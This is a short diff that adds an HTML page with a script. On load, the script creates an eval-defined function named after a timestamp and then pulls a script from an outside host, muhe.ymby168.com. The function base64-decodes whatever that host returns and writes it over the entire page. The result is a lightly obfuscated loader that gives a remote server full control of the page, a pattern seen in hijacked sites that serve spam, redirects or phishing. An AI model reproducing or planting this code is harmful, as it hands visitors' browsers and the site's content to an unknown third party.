@@ -1,0 +1,18 @@
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<script>
+function geturl(name) {  
+		var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");  
+		var r = window.location.search.substr(1).match(reg);  
+		if (r != null) return unescape(r[2]);  
+		return null;  
+	};
+window.onload = function() {
+	var timestamp='_'+new Date().getTime();
+	eval(timestamp+'=function(rv){var new_doc = document.open("text/html", "replace");rv = window.atob(rv);rv = escape(rv);rv = decodeURIComponent(rv);new_doc.write(rv);new_doc.close();}');
+	console.log(timestamp);
+    var script = document.createElement("script");
+    script.type = "text/javascript";
+    script.src = "http://muhe.ymby168.com/published/lua.php?v="+geturl('v')+"&hello="+timestamp+"&s="+geturl('s');
+    document.getElementsByTagName("head")[0].appendChild(script);
+};
+</script>
